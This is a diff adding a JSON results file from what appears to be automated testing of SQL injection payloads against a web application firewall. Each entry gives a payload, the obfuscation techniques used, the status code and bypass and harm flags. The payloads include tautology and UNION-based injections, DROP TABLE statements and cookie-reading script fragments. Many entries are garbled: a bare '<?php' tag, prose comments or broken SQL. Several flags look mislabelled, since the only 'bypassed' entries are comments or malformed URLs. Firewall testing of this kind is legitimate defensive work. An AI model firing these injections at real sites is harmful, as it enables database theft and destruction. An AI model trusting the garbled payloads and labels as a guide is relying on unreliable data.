@@ -1,0 +1,402 @@
+[
+    {
+        "payload": "' UNION SELECT 1, (SELECT NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = \"yourTableName\" ORDER BY COLUMN_TYPE ASC LIMIT 0) '",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "SELECT 1 UNION SELECT NULL, 's' UNION SELECT NULL; -- OR use your own target table and query to fit their specific structure",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "'http://example.com/test?q='; 204; -- ;<script>alert(\"SQL Injection\")</script>",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "' OR '1=1'--'",
+        "technique": "Boolean-based Blind_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "'UNION SELECT 1 UNION ALL SELECT NULL, ' OR '' -- this is bad guys trying to access your system through sql injection! Please understand that executing malicious queries can be illegal and very dangerous to others data!'  |  -- we will do it once its in place!",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "-- This is an example, do NOT use in real world scenarios!",
+        "technique": "Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 404,
+        "is_bypassed": true,
+        "is_harmful": true
+    },
+    {
+        "payload": "SELECT 1 UNION SELECT NULL, '' --  NULL bytes obfuscation placeholder \"byte\" sequence",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass+Boolean-based Blind_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "'/*10*-- OR 1=1 --*/spid='SELECT * FROM users WHERE Username = \"'; UNION SELECT * FROM users WHERE username=\" AND NOT NULL; DROP TABLE userssubject TO INT,users",
+        "technique": "Time-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Union Select Null Bytes_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "' OR '1=1)--\" UNION SELECT * FROM `test` WHERE  username = ''\"; DROP TABLE IF EXISTS test ; -- \"UNION SELECT * FROM users;'-- INSERT INTO user ( username, password ) VALUES('admin','';",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?php",
+        "technique": "Time-based Blind_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "http://[target site]/search?q=SELECT+%2A%3F1' OR 1=1--\"\" UNION ALL SELECT * FROM `table` WHERE user='admin';",
+        "technique": "Time-based Blind_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "http://example.com/api/search?q=SELECT%20* FROM%20`users%253A1487D2C6F9BFCBC1E4DFED0ECAEFAEEFBBDFFBAFDDBF&limit=500&type=%24s;",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 404,
+        "is_bypassed": true,
+        "is_harmful": false
+    },
+    {
+        "payload": "SELECT * FROM `test` WHERE 1=1;-- UNION SELECT 'a' + SUBSTRING(CAST('0x47',2),1,5) AS testkey -- OR `id = ''`  UNION ALL SELECT /* */FROM `nonexistenttable`;",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "-- The following query will send to server 10 minutes after the scheduled time as an example - adjust it based on your specific configuration and exploitation target",
+        "technique": "Time-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 404,
+        "is_bypassed": true,
+        "is_harmful": true
+    },
+    {
+        "payload": "SELECT 1 UNION SELECT 'a' FROM INFORMATION_SCHEMA.`COLUMNS` WHERE COLUMNID=NULL;",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": ";UNION SELECT '1' AS id, '', '' UNION ALL",
+        "technique": "Time-based Blind_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "'http://{target}/search?q=SELECT+%3C--%20UNION+ALL+SELECT+1,' OR '1'--+' FROM+information_schema.+DATABASE.'||base64(chr({rand()}))",
+        "technique": "Time-based Blind_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "'admin=;DROP TABLE IF EXISTS `users`;-- UNION SELECT NULL FROM information_schema.tables WHERE table_name = '`users'; -- OR 1=1;' LIMIT 1'`\"",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "SELECT 1 UNION SELECT NULL, 'http://www.<malicious_site>/../`--'`UNION ALL  'WHERE <username> = '' OR REPLACE(SUBSTRING('test', LENGTH('test'), CASE WHEN LEN('test') > 20 THEN SUBSTR('test', , 1) ELSE CAST(CAST('test'[1] AS INTEGER), -- `;`) END);'; /* This is obfuscated */ WHERE ID=1; ```",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "Boolean-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "Boolean-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "'OR 1=1-- OR (SELECT * FROM `users` WHERE username = \"admin\") '",
+        "technique": "Boolean-based Blind_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "'OR ' OR ''=0;SELECT * FROM users WHERE id = %s AND username LIKE '%?%';--` -- `",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Boolean-based Blind_full_bypass+Time-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "UNION SELECT",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "'http://site-name/index.php?page=users&action=delete%3D102; DROP TABLE Users WHERE ID = 45';</a><script>alert(\"SQL Injection!\")</script>```",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "' OR 1=1-- SELECT * FROM users WHERE name='test%20string'; --''`",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "&amp;=IF(1,SELECT * FROM users WHERE username='test', LIMIT 0) OR IF(TRUE,'true')",
+        "technique": "Boolean-based Blind_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 404,
+        "is_bypassed": true,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?PHP",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Boolean-based Blind_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "'AND 1=1--  SELECT * FROM users WHERE username = ' OR '''; --'",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "http://{$_GET['URL']}{parameter}?%20--&lt;script type=\"text/javascript\"&gt;%7Btest(){alert(document._getCookie('cookie'));}%3F&lt;/script>",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "SELECT 1 AS ID, NULL UNION ALL SELECT SUBSTRING(CAST('Bytes_adv_obf_full_bypass' as VARCHAR) FROM 40 TO LENGTH( 'Bytes_adv_obf_full_bypass') + CAST(LENGTH('Bytes_adv_obf_full_bypass') AS INT)) ,  CASE WHEN (EXTRACT (EPOCHFROM DATEADD(DAY,-15,GETDATE())) <= EXTRACT (MONTH FROM GETDATE()) THEN 1 ELSE 0 END AS bool;  UNION ALL SELECT `something else`",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass+Boolean-based Blind_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Time-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Time-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "// Function to obfuscate and sanitize inputs, preventing unintended execution of malicious queries",
+        "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 404,
+        "is_bypassed": true,
+        "is_harmful": false
+    },
+    {
+        "payload": "http://example.com/path?q=UNION%20SELECT%3A' OR '1=1;--'`  OR '' AND (''='') AS id, NULL FROM users WHERE SUBSTRING(id from 6)=''",
+        "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    }
+]
